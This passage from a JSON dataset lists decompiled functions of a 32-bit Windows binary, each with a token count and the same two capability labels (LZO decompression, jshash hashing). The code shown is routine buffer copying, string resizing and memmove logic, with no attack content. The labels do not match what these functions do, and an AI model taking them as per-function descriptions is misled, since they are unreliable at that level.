}\n    *unaff_EBP = iVar4 + 0x10;\n    return;\n}\n",
        "token_count": 475
    },
    "00401fd0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nulong fcn.00401fd0(int32_t **param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t **ppiVar6;\n    int32_t **ppiVar7;\n    ulong uVar8;\n    \n    piVar2 = (**(**param_1 + 0x10))();\n    ppiVar6 = param_1 + 3;\n    if ((-1 < param_1[3]) && (piVar2 == *param_1)) {\n        LOCK();\n        piVar2 = *ppiVar6;\n        *ppiVar6 = *ppiVar6 + 1;\n        return CONCAT44(piVar2, param_1);\n    }\n    iVar3 = (***piVar2)(param_1[1], 1);\n    if (iVar3 == 0) {\n        fcn.004010c0(0x8007000e);\n        pcVar1 = swi(3);\n        uVar8 = (*pcVar1)();\n        return uVar8;\n    }\n    *(iVar3 + 4) = param_1[1];\n    uVar4 = param_1[1] + 1;\n    ppiVar6 = param_1 + 4;\n    ppiVar7 = iVar3 + 0x10;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    for (uVar5 = uVar4 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *ppiVar7 = *ppiVar6;\n        ppiVar6 = ppiVar6 + 1;\n        ppiVar7 = ppiVar7 + 1;\n    }\n    return CONCAT44(uVar4, iVar3);\n}\n",
        "token_count": 467
    },
    "00402700": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402700(int32_t param_1, char param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        puVar1 = *(param_1 + 4);\n        if (param_3 != 0) {\n            puVar3 = puVar1;\n            puVar4 = param_1 + 4;\n            for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        fcn.0041bae1(puVar1);\n    }\n    *(param_1 + 0x14) = param_3;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4 + param_3) = 0;\n    return;\n}\n",
        "token_count": 343
    },
    "00402a30": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402a30(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint32_t var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43ab70;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar4 = var_8h | 0xf;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(in_ECX + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_8h = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            var_8h = uVar3 + uVar1;\n        }\n    }\n    var_4h = 0;\n    puVar2 = fcn.0041bab6(var_8h + 1);\n    if (var_ch != 0) {\n        if (*(in_ECX + 0x18) < 0x10) {\n            puVar5 = in_ECX + 4;\n        }\n        else {\n            puVar5 = *(in_ECX + 4);\n        }\n        puVar6 = puVar2;\n        for (uVar4 = var_ch >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        for (uVar4 = var_ch & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    if (0xf < *(in_ECX + 0x18)) {\n        fcn.0041bae1(*(in_ECX + 4));\n    }\n    puVar5 = in_ECX + 4;\n    *puVar5 = 0;\n    *puVar5 = puVar2;\n    *(in_ECX + 0x18) = var_8h;\n    *(in_ECX + 0x14) = var_ch;\n    if (0xf < var_8h) {\n        puVar5 = puVar2;\n    }\n    *(puVar5 + var_ch) = 0;\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 719
    },
    "00402ef0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.00402ef0(int32_t **param_1, int32_t param_2, uint *param_3, uint32_t param_4, int32_t param_5)\n\n{\n    uchar *puVar1;\n    int32_t **ppiVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t **ppiVar5;\n    int32_t **ppiVar6;\n    uint *puVar7;\n    \n    puVar1 = param_3 + param_5;\n    if ((1U - (*param_1)[-1] | (*param_1)[-2] - puVar1) < 0) {\n        fcn.00401f80(puVar1);\n    }\n    ppiVar2 = *param_1;\n    ppiVar5 = param_1;\n    ppiVar6 = ppiVar2;\n    for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *ppiVar6 = *ppiVar5;\n        ppiVar5 = ppiVar5 + 1;\n        ppiVar6 = ppiVar6 + 1;\n    }\n    for (uVar4 = param_3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *ppiVar6 = *ppiVar5;\n        ppiVar5 = ppiVar5 + 1;\n        ppiVar6 = ppiVar6 + 1;\n    }\n    puVar7 = ppiVar2 + param_2;\n    for (uVar4 = param_4 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *param_3;\n        param_3 = param_3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (param_4 = param_4 & 3; param_4 != 0; param_4 = param_4 - 1) {\n        *puVar7 = *param_3;\n        param_3 = param_3 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    if ((-1 < puVar1) && (puVar1 <= (*param_1)[-2])) {\n        (*param_1)[-3] = puVar1;\n        puVar1[*param_1] = 0;\n        return;\n    }\n    fcn.004010c0(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 585
    },
    "00402f80": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402f80(int32_t *param_1, uint *param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *extraout_EDX;\n    uint32_t unaff_ESI;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    uint *arg_8h;\n    uint *unaff_retaddr;\n    uint32_t in_stack_ffffffec;\n    \n    if (param_3 == 0) {\n        fcn.004014a0();\n        return;\n    }\n    if (param_2 != NULL) goto code_r0x00402fa8;\n    do {\n        fcn.004010c0();\n        param_2 = extraout_EDX;\ncode_r0x00402fa8:\n        iVar1 = *param_1;\n        uVar3 = param_2 - iVar1;\n        uVar2 = *(iVar1 + -0xc);\n        if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n            param_2 = unaff_retaddr;\n            in_stack_ffffffec = param_3;\n            fcn.00401f80(param_3, unaff_EDI, unaff_ESI);\n            unaff_retaddr = param_2;\n        }\n        unaff_ESI = unaff_EDI;\n        unaff_EDI = in_stack_ffffffec;\n        arg_8h = *param_1;\n        if (uVar2 < uVar3) {\n            for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *arg_8h = *param_2;\n                param_2 = param_2 + 1;\n                arg_8h = arg_8h + 1;\n            }\n        }\n        else {\n            fcn.0040a2e0(arg_8h, arg_8h + uVar3, param_3);\n        }\n        in_stack_ffffffec = unaff_EDI;\n    } while ((param_3 < 0) || (*(*param_1 + -8) < param_3));\n    *(*param_1 + -0xc) = param_3;\n    *(param_3 + *param_1) = 0;\n    return;\n}\n",
        "token_count": 604
    },
    "00403770": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00403770(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t noname_0;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint unaff_EDI;\n    int32_t *piVar4;\n    uint unaff_retaddr;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.004191ca();\n    }\n    noname_0 = *(param_2 + 0x14) - param_3;\n    if (param_4 < noname_0) {\n        noname_0 = param_4;\n    }\n    if (param_1 != param_2) {\n        if (noname_0 == 0xffffffff) {\n            fcn.00419265();\n        }\n        if (*(param_1 + 0x18) < noname_0) {\n            fcn.00402a30(noname_0, *(param_1 + 0x14), unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX, unaff_retaddr, param_2\n                         , param_3, param_4);\n        }\n        else if (noname_0 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (noname_0 != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            piVar4 = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar4 = *piVar1;\n            }\n            puVar3 = param_3 + param_2;\n            for (uVar2 = noname_0 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            for (uVar2 = noname_0 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            *(param_1 + 0x14) = noname_0;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + noname_0) = 0;\n        }\n        return param_1;\n    }\n    fcn.004029b0(noname_0 + param_3, 0xffffffff);\n    fcn.004029b0(0, param_3);\n    return param_1;\n}\n",
        "token_count": 784
    },
    "004038a0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004038a0(int32_t param_1, uint *param_2, uint32_t param_3, uint param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar4 = *(param_1 + 0x18);\n    if (uVar4 < 0x10) {\n        puVar1 = param_1 + 4;\n    }\n    else {\n        puVar1 = *(param_1 + 4);\n    }\n    if (puVar1 <= param_2) {\n        puVar1 = param_1 + 4;\n        puVar3 = puVar1;\n        if (0xf < uVar4) {\n            puVar3 = *puVar1;\n        }\n        if (param_2 < *(param_1 + 0x14) + puVar3) {\n            if (0xf < uVar4) {\n                puVar1 = *puVar1;\n            }\n            iVar2 = fcn.00403770(param_1, param_2 - puVar1, param_3);\n            return iVar2;\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.00419265();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.00402a30(param_3, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, \n                     param_3, param_4);\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (*(param_1 + 0x18) < 0x10) {\n            *(param_1 + 4) = 0;\n            return param_1;\n        }\n        **(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            puVar1 = param_1 + 4;\n        }\n        else {\n            puVar1 = *(param_1 + 4);\n        }\n        for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        for (uVar4 = param_3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            *(*(param_1 + 4) + param_3) = 0;\n            return param_1;\n        }\n        *(param_1 + 4 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 782
    },
    "004043c0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004043c0(int32_t param_1, uint32_t param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_EBP;\n    uint32_t noname_0;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar4;\n    uint unaff_retaddr;\n    \n    if (-*(param_1 + 0x14) - 1U <= param_2) {\n        fcn.00419265();\n    }\n    if (param_2 != 0) {\n        noname_0 = *(param_1 + 0x14) + param_2;\n        if (noname_0 == 0xffffffff) {\n            fcn.00419265();\n        }\n        if (*(param_1 + 0x18) < noname_0) {\n            fcn.00402a30(noname_0, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_retaddr, param_2, param_3, \n                         param_4, param_5);\n        }\n        else if (noname_0 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (noname_0 != 0) {\n            if (*(param_1 + 0x18) < 0x10) {\n                iVar3 = param_1 + 4;\n            }\n            else {\n                iVar3 = *(param_1 + 4);\n            }\n            uVar1 = unaff_retaddr;\n            puVar4 = *(param_1 + 0x14) + iVar3;\n            for (uVar2 = param_2 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = CONCAT22(CONCAT11(uVar1, uVar1), CONCAT11(uVar1, uVar1));\n                puVar4 = puVar4 + 1;\n            }\n            for (param_2 = param_2 & 3; param_2 != 0; param_2 = param_2 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            *(param_1 + 0x14) = noname_0;\n            if (0xf < *(param_1 + 0x18)) {\n                *(*(param_1 + 4) + noname_0) = 0;\n                return param_1;\n            }\n            *(param_1 + 4 + noname_0) = 0;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 684
    },
    "00406b90": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00406b90(int32_t *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t unaff_EBX;\n    uint *puVar4;\n    uint *unaff_retaddr;\n    \n    iVar1 = *param_1;\n    uVar3 = *(iVar1 + -0xc);\n    param_3 = uVar3 + param_3;\n    if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n        fcn.00401f80(param_3);\n    }\n    if (param_2 - iVar1 <= uVar3) {\n        unaff_retaddr = *param_1 + (param_2 - iVar1);\n    }\n    puVar4 = *param_1 + unaff_EBX;\n    for (uVar3 = param_2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar4 = *unaff_retaddr;\n        unaff_retaddr = unaff_retaddr + 1;\n        puVar4 = puVar4 + 1;\n    }\n    for (param_2 = param_2 & 3; param_2 != 0; param_2 = param_2 - 1) {\n        *puVar4 = *unaff_retaddr;\n        unaff_retaddr = unaff_retaddr + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((-1 < param_3) && (param_3 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = param_3;\n        *(param_3 + *param_1) = 0;\n        return;\n    }\n    fcn.004010c0(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 454
    },
    "0040a2e0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040a2e0(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x0040a4a4;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x40a5c8\n            switch(*((arg_10h & 3) * 4 + 0x40a5c8)) {\n            case 0x40a5e0:\ncode_r0x0040a5e0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x40a5f0:\ncode_r0x0040a5f0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x40a604:\ncode_r0x0040a604:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x40a5c8\n            switch(*(arg_10h * 4 + 0x40a5c8)) {\n            case 0x40a5e0:\n                goto code_r0x0040a5e0;\n            case 0x40a5f0:\n                goto code_r0x0040a5f0;\n            case 0x40a604:\n                goto code_r0x0040a604;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x40a4cc)) {\n            case 0x40a4dc:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x0040a4a4:\n    // WARNING: Could not recover jumptable at 0x0040a4a6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x40a578\n                    puVar1 = (**(uVar3 * -4 + 0x40a578))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40a5c8)) {\n                case 0x40a5e0:\n                    goto code_r0x0040a5e0;\n                case 0x40a5f0:\n                    goto code_r0x0040a5f0;\n                case 0x40a604:\n                    goto code_r0x0040a604;\n                }\n                break;\n            case 0x40a500:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x0040a4a4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40a5c8)) {\n                case 0x40a5e0:\n                    goto code_r0x0040a5e0;\n                case 0x40a5f0:\n                    goto code_r0x0040a5f0;\n                case 0x40a604:\n                    goto code_r0x0040a604;\n                }\n                break;\n            case 0x40a528:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x0040a4a4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40a5c8)) {\n                case 0x40a5e0:\n                    goto code_r0x0040a5e0;\n                case 0x40a5f0:\n                    goto code_r0x0040a5f0;\n                case 0x40a604:\n                    goto code_r0x0040a604;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0040a33c;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x40a42c\n        switch(*((arg_10h & 3) * 4 + 0x40a42c)) {\n        case 0x40a444:\ncode_r0x0040a444:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x40a450:\ncode_r0x0040a450:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x40a464:\ncode_r0x0040a464:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x40a43c)) {\n        case 0x40a444:\n            goto code_r0x0040a444;\n        case 0x40a450:\n            goto code_r0x0040a450;\n        case 0x40a464:\n            goto code_r0x0040a464;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x40a340)) {\n        case 0x40a350:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0040a33c:\n    // WARNING: Could not recover jumptable at 0x0040a33c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x40a3c0\n                puVar1 = (**(uVar2 * 4 + 0x40a3c0))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40a42c)) {\n            case 0x40a444:\n                goto code_r0x0040a444;\n            case 0x40a450:\n                goto code_r0x0040a450;\n            case 0x40a464:\n                goto code_r0x0040a464;\n            }\n            break;\n        case 0x40a37c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0040a33c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40a42c)) {\n            case 0x40a444:\n                goto code_r0x0040a444;\n            case 0x40a450:\n                goto code_r0x0040a450;\n            case 0x40a464:\n                goto code_r0x0040a464;\n            }\n            break;\n        case 0x40a3a0:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0040a33c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x40a42c)) {\n            case 0x40a444:\n                goto code_r0x0040a444;\n            case 0x40a450:\n                goto code_r0x0040a450;\n            case 0x40a464:\n                goto code_r0x0040a464;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2775
    },
    "0040b7b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040b7b0(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x0040b974;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x40ba98\n            switch(*((arg_10h & 3) * 4 + 0x40ba98)) {\n            case 0x40bab0:\ncode_r0x0040bab0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x40bac0:\ncode_r0x0040bac0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x40bad4:\ncode_r0x0040bad4:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x40ba98\n            switch(*(arg_10h * 4 + 0x40ba98)) {\n            case 0x40bab0:\n                goto code_r0x0040bab0;\n            case 0x40bac0:\n                goto code_r0x0040bac0;\n            case 0x40bad4:\n                goto code_r0x0040bad4;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x40b99c)) {\n            case 0x40b9ac:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x0040b974:\n    // WARNING: Could not recover jumptable at 0x0040b976. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x40ba48\n                    puVar1 = (**(uVar3 * -4 + 0x40ba48))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40ba98)) {\n                case 0x40bab0:\n                    goto code_r0x0040bab0;\n                case 0x40bac0:\n                    goto code_r0x0040bac0;\n                case 0x40bad4:\n                    goto code_r0x0040bad4;\n                }\n                break;\n            case 0x40b9d0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x0040b974;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40ba98)) {\n                case 0x40bab0:\n                    goto code_r0x0040bab0;\n                case 0x40bac0:\n                    goto code_r0x0040bac0;\n                case 0x40bad4:\n                    goto code_r0x0040bad4;\n                }\n                break;\n            case 0x40b9f8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto 